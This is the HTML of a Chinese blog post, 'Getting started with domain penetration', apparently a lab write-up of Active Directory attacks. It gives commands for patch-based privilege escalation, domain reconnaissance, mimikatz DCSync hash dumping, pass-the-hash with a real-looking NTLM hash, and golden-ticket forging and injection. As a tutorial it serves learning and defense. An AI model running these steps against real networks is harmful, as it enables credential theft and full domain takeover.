@@ -1,0 +1,262 @@
+
+<!DOCTYPE html>
+<html>
+  <head>
+    
+<meta charset="utf-8" >
+
+<title>初识域渗透---持续更新 | Mari0er&#39;s Blog</title>
+<meta name="description" content="">
+
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.7.0/animate.min.css">
+
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
+<link rel="shortcut icon" href="https://mari0er.top/favicon.ico?v=1768205765236">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+<link rel="stylesheet" href="https://mari0er.top/styles/main.css">
+
+
+
+<script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>
+<script src="https://cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>
+
+
+
+  </head>
+  <body>
+    <div id="app" class="main">
+      <div class="site-header-container">
+  <div class="site-header">
+    <div class="left">
+      <a href="https://mari0er.top">
+        <img class="avatar" src="https://mari0er.top/images/avatar.png?v=1768205765236" alt="" width="32px" height="32px">
+      </a>
+      <a href="https://mari0er.top">
+        <h1 class="site-title">Mari0er&#39;s Blog</h1>
+      </a>
+    </div>
+    <div class="right">
+      <transition name="fade">
+        <i class="icon" :class="{ 'icon-close-outline': menuVisible, 'icon-menu-outline': !menuVisible }" @click="menuVisible = !menuVisible"></i>
+      </transition>
+    </div>
+  </div>
+</div>
+
+<transition name="fade">
+  <div class="menu-container" style="display: none;" v-show="menuVisible">
+    <div class="menu-list">
+      
+        
+          <a href="/" class="menu purple-link">
+            首页
+          </a>
+        
+      
+        
+          <a href="/archives" class="menu purple-link">
+            归档
+          </a>
+        
+      
+        
+          <a href="/tags" class="menu purple-link">
+            标签
+          </a>
+        
+      
+        
+          <a href="https://mari0er.top/post/about.html" class="menu purple-link">
+            关于
+          </a>
+        
+      
+    </div>
+  </div>
+</transition>
+
+
+      <div class="content-container">
+        <div class="post-detail">
+          
+            <div class="feature-container" style="background-image: url('https://tuchuang.looklook.workers.dev/2727/domainusers.png')">
+            </div>
+          
+          <h2 class="post-title">初识域渗透---持续更新</h2>
+          <div class="post-info post-detail-info">
+            <span><i class="icon-calendar-outline"></i> 2020-05-01</span>
+            
+              <span>
+                <i class="icon-pricetags-outline"></i>
+                
+                  <a href="https://mari0er.top/tag/yu-shen-tou/">
+                    域渗透
+                    
+                      ，
+                    
+                  </a>
+                
+                  <a href="https://mari0er.top/tag/domain/">
+                    domain
+                    
+                      ，
+                    
+                  </a>
+                
+                  <a href="https://mari0er.top/tag/nei-wang/">
+                    内网
+                    
+                  </a>
+                
+              </span>
+            
+          </div>
+          <div class="post-content">
+            <p>  在取得授权的情况下，成功打入到一个企业的大型域环境，结果对域渗透不熟悉，导致进度卡壳。恰好手头有几台空闲的服务器，于是自己搭建了域环境进行学习，<s><em>毕竟再不练习就真的就啥都不知道了</em></s>。</p>
+<!-- more -->
+<h3 id="0x01-环境介绍">0x01 环境介绍</h3>
+<p>域环境搭建过程省略，网上可以找到很多类似的文章。搭建的环境有四台主机，一台域控，三台域主机。</p>
+<blockquote>
+<p>域控：Win server 2012<br>
+域主机：Win10、Win server 2008、Win 7</p>
+</blockquote>
+<p>文章主要记录一次完整的内网域渗透流程，突破口入侵省略，以上线CS的Win7域主机为起点。<br>
+<img src="https://tuchuang.looklook.workers.dev/2727/CS.png" alt="CS" loading="lazy"></p>
+<h3 id="0x02-域环境信息收集">0x02 域环境信息收集</h3>
+<h4 id="一-提权">(一)、提权</h4>
+<p>(提权放在第一步是因为内网很多操作都需要管理员权限)<br>
+查询机器安装的补丁情况，通过在线工具查找可能存在的提权漏洞</p>
+<pre><code>获取机器补丁安装情况
+
+systeminfo | findstr KB
+</code></pre>
+<figure data-type="image" tabindex="1"><img src="https://tuchuang.looklook.workers.dev/2727/KB.png" alt="KB" loading="lazy"></figure>
+<p>复制查询出的补丁号，通过以下在线网站进行漏洞查询<br>
+<a href="http://bugs.hacking8.com/tiquan">http://bugs.hacking8.com/tiquan</a><br>
+<a href="https://i.hacking8.com/tiquan">https://i.hacking8.com/tiquan</a><br>
+<a href="http://blog.neargle.com/win-powerup-exp-index">http://blog.neargle.com/win-powerup-exp-index</a></p>
+<figure data-type="image" tabindex="2"><img src="https://tuchuang.looklook.workers.dev/2727/MS15051.png" alt="ms15051" loading="lazy"></figure>
+<p>可以看到可能存在MS15-051提权漏洞，利用后成功得到一个管理员权限的CS会话。<br>
+<img src="https://tuchuang.looklook.workers.dev/2727/system.png" alt="system" loading="lazy"></p>
+<h4 id="二-信息收集">(二)、信息收集</h4>
+<pre><code>查询当前登录域
+net config workstation
+
+查看域用户
+net user /domain
+
+查询域内所有计算机列表
+net group &quot;domain computers&quot; /domain
+
+查询当前时间，一般为域控
+net time /domain
+
+查看域控制器
+net group &quot;Domain Controllers&quot; /domain
+带&amp;的为域控的机器名，可通过ping找到域控IP地址
+</code></pre>
+<figure data-type="image" tabindex="3"><img src="https://tuchuang.looklook.workers.dev/2727/workstation.png" alt="workstation" loading="lazy"></figure>
+<figure data-type="image" tabindex="4"><img src="https://tuchuang.looklook.workers.dev/2727/domainusers.png" alt="domainuser" loading="lazy"></figure>
+<figure data-type="image" tabindex="5"><img src="https://tuchuang.looklook.workers.dev/2727/PCname.png" alt="PC" loading="lazy"></figure>
+<figure data-type="image" tabindex="6"><img src="https://tuchuang.looklook.workers.dev/2727/DCtime1.png" alt="TIME" loading="lazy"></figure>
+<figure data-type="image" tabindex="7"><img src="https://tuchuang.looklook.workers.dev/2727/DC.png" alt="DC" loading="lazy"></figure>
+<h3 id="0x03-域渗透流程">0x03 域渗透流程</h3>
+<h4 id="1取得权限的机器上有域管理员的信息">1.取得权限的机器上有域管理员的信息</h4>
+<p>在域主机上通过mimikatz可以查询出域控的Hash值或者密码(这种情况比较少)，说明域管理员曾经登录过该机器(修改配置都需要进行登录)</p>
+<pre><code>获取域内所有用户的Hash值，需管理权权限运行mimikatz
+privilege::debug 
+lsadump::dcsync /domain:god.org /all /csv
+</code></pre>
+<figure data-type="image" tabindex="8"><img src="https://tuchuang.looklook.workers.dev/2727/DC1.png" alt="hash" loading="lazy"></figure>
+<p>此时可以直接通过mimikatz进行Hash传递,传递完成后会自动生成一个新的CMD窗口</p>
+<pre><code>sekurlsa::pth /user:administrator /domain:&quot;anke.test&quot; /ntlm:ab4a873b39a7e31e91e517198df53d6f
+</code></pre>
+<figure data-type="image" tabindex="9"><img src="https://tuchuang.looklook.workers.dev/2727/hash1.png" alt="hash1" loading="lazy"></figure>
+<p>可以看到通过生成的CMD窗口能直接查询域控的C盘目录文件，之后利用PsExec.exe执行命令获取一个域控服务器的CMD窗口，ipconfig可以看到<strong>192.168.200.105</strong>正是上面时间服务器的IP，成功拿下域控权限。<br>
+<img src="https://tuchuang.looklook.workers.dev/2727/DC2.png" alt="DC2" loading="lazy"></p>
+<h4 id="2取得权限的机器上没有域管理员的相关信息">2.取得权限的机器上没有域管理员的相关信息</h4>
+<p>这时候就需要通过其他方式进行渗透，比如通过横向渗透在其他域主机上寻找域管理员的信息、利用票据、利用其他漏洞等。<br>
+<strong>1）黄金票据</strong></p>
+<blockquote>
+<p>在域环境中，存在一个SID为502的域账号krbtgt。krbtgt是KDC服务使用的账号,属于Domain Admins &gt;组。在域环境中，每个用户的账号票据都是由krbtgt生成的，如果攻击者拿到了krbtgt的NTLM Hash或者AES-256的值,就可以伪造域内任意用户的身份，并以该用户的身份访问其服务。</p>
+</blockquote>
+<p>使用域的Golden Ticket(黄金票据)进行票据传递攻击时,需要掌握以下信息:</p>
+<ul>
+<li>krbtgt的SID值</li>
+<li>krbtgt的Hash值</li>
+<li>域管理员的用户名</li>
+</ul>
+<p>在域主机上通过mimikatz获取Hash和SID(这里-502需要删除)</p>
+<pre><code>privilege::debug
+lsadump::dcsync /user:krbtgt
+</code></pre>
+<figure data-type="image" tabindex="10"><img src="https://tuchuang.looklook.workers.dev/2727/krbtgt.png" alt="krbtgt" loading="lazy"></figure>
+<p>在自己本地的机器上利用mimikatz生成票据</p>
+<pre><code>kerberos::golden /admin:administrator /domain:域名 /sid:SID /krbtgt:hash值 /ticket:文件名.kiribi
+
+kerberos::golden /admin:administrator /domain:anke.test /sid:S-1-5-21-948049343-4079134984-305484938 /krbtgt:ed572a82485c06ea6b5a824810409246 /ticket:administrator.kiribi
+
+</code></pre>
+<figure data-type="image" tabindex="11"><img src="https://tuchuang.looklook.workers.dev/2727/ticket.png" alt="ticket" loading="lazy"></figure>
+<p>生成后将票据上传至域主机，利用mimikatz导入进内存，导入成功后可以看到在域主机上能成功查询域控C盘目录文件，拿下域控。(PsExec只是一种方法，获取权限还有很多其他的方式)</p>
+<pre><code>kerberos::purge                      //清空当前机器中所有凭证
+kerberos::list                       //查看当前机器凭证
+kerberos::ptt administrator.kiribi   //将票据注入到内存中
+</code></pre>
+<figure data-type="image" tabindex="12"><img src="https://tuchuang.looklook.workers.dev/2727/kibiri.png" alt="kiribi" loading="lazy"></figure>
+
+          </div>
+        </div>
+
+        
+          <div class="next-post">
+            <a class="purple-link" href="https://mari0er.top/post/ms17-010.html/">
+              <h3 class="post-title">
+                下一篇：MS17-010利用总结
+              </h3>
+            </a>
+          </div>
+          
+      </div>
+
+      
+
+      <div class="site-footer">
+  <div class="slogan"></div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+  待人友善是修养 独来独往是性格 | <a class="rss" href="https://mari0er.top/atom.xml" target="_blank">RSS</a>
+</div>
+
+
+    </div>
+    <script type="application/javascript">
+
+hljs.initHighlightingOnLoad()
+
+var app = new Vue({
+  el: '#app',
+  data: {
+    menuVisible: false,
+  },
+})
+
+</script>
+
+
+
+
+  </body>
+</html>
